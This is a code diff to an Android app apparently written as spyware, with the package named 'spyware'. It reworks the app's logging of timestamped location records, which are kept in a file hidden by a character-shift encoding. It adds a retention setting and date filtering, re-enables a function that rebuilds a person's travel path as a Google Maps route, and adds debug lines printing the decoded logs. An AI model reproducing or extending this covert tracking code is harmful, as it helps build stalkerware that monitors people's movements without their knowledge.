@@ -4,6 +4,7 @@ import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
 import com.example.spyware.common.Constants.Companion.END_TIMESTAMP
 import com.example.spyware.common.Constants.Companion.ERROR
 import com.example.spyware.common.Constants.Companion.LATITUDE
+import com.example.spyware.common.Constants.Companion.LOG_TIME_TO_LIVE_DAYS
 import com.example.spyware.common.Constants.Companion.LONGITUDE
 import com.example.spyware.common.Constants.Companion.START_TIMESTAMP
 import com.example.spyware.common.Constants.Companion.TIMESTAMP
@@ -41,6 +42,7 @@ private fun shiftStringForward(str: String, n: Int): String {
 
 // Write encoded data to file
 fun writeShiftedToFile(location: File, fileName: String, data: String, n: Int) {
+    println("halo2: "+data)
     try {
         if (!location.exists()) location.mkdirs()
 
@@ -85,9 +87,26 @@ fun filterLogsOnDate(logs:String, startInstant:Instant?, endInstant:Instant?): S
     return filteredLogs
 }
 
+fun filterLogsOnDate(logs:List<JSONObject>, startInstant:Instant?, endInstant:Instant?): List<JSONObject> {
+    if(startInstant==null||endInstant==null)
+        return logs
+    return logs.filter { log ->
+        try {
+
+            val timestampStr = log.getString(TIMESTAMP)
+            if (timestampStr.isNotEmpty()) {
+                val timestamp = Instant.parse(timestampStr)
+                timestamp.isAfter(startInstant) && timestamp.isBefore(endInstant)
+            } else {
+                true // Keep lines without timestamp (or handle as needed)
+            }
+        } catch (e: Exception) { true /* Keep malformed lines or handle error */ }
+    }
+}
+
 fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
     val content:String?=readShiftedFromFile(location,fileName,n)
-    val oneYearAgo = Instant.now().minus(365, ChronoUnit.DAYS)
+    val oneYearAgo = Instant.now().minus(LOG_TIME_TO_LIVE_DAYS, ChronoUnit.DAYS)
     val filteredContent = filterLogsOnDate(content ?: "",oneYearAgo,Instant.now())
     val newContent = (if (filteredContent.isNotEmpty()) filteredContent + "\n" else "") + data
     writeShiftedToFile(location,fileName,newContent,n)
@@ -96,11 +115,15 @@ fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
 fun log(context:Context, jsonObject: JSONObject){
     val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
     jsonObject.put(TIMESTAMP, currentUtcTime)
-    appendShiftedToFile(context.filesDir,outputFileName, jsonObject.toString(),logShift)
+    val logs=getLogs(context)
+    var filteredLogs=filterLogsOnDate(logs,Instant.now().minus(LOG_TIME_TO_LIVE_DAYS, ChronoUnit.DAYS),Instant.now())
+    filteredLogs=filteredLogs+jsonObject
+    writeShiftedToFile(context.filesDir,outputFileName,filteredLogs.map{it.toString()}.joinToString("\n") ?: "", logShift)
 }
 
 fun getLogs(context:Context):List<JSONObject>{
     val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
+    println("halo1: "+content)
     return content?.lines()?.filter { it.isNotBlank() }?.map { JSONObject(it) } ?: listOf()
 }
 
@@ -113,20 +136,20 @@ fun getErrorStringsFromLogs(context:Context): String {
  * Get important locations from logs.
  */
 fun getReducedLogs(context:Context,startInstant:Instant?,endInstant:Instant?): String {
-    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
-    val filteredLogs= filterLogsOnDate(content?:return "",startInstant,endInstant)
-    val locationJSONObjects= filteredLogs.lines().filter { it.isNotBlank() }.map { JSONObject(it) }.filter { it.has(LATITUDE) }
+    val logs=getLogs(context)
+    val filteredLogs= filterLogsOnDate(logs,startInstant,endInstant)
+    val locationJSONObjects= filteredLogs.filter { it.has(LATITUDE) }
     val importantLocations=getImportantLocations(locationJSONObjects)
     return importantLocations.map{ formatHeatmap(it)}.joinToString("\n")
 }
 
-//fun getTraversedPath(context:Context,startInstant:Instant?,endInstant:Instant?): String {
-//    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
-//    val filteredLogs= filterLogsOnDate(content?:return "",startInstant,endInstant)
-//    val locationLogs= filteredLogs?.lines()?.filter { it.contains("\""+ LATITUDE"\":") }?.joinToString("\n") ?: ""
-//    val result=getImportantLocations(locationLogs)
-//    return result
-//}
+fun getTraversedPath(context:Context,startInstant:Instant?,endInstant:Instant?): String {
+    val logs=getLogs(context)
+    val filteredLogs= filterLogsOnDate(logs,startInstant,endInstant)
+    val locationLogs= filteredLogs.filter { it.has(LATITUDE) }
+    val importantLocations=getImportantLocations(locationLogs)
+    return getGoogleMapsPath(importantLocations)
+}
 
 
 fun getImportantLocations(locations:List<JSONObject>): List<JSONObject> {
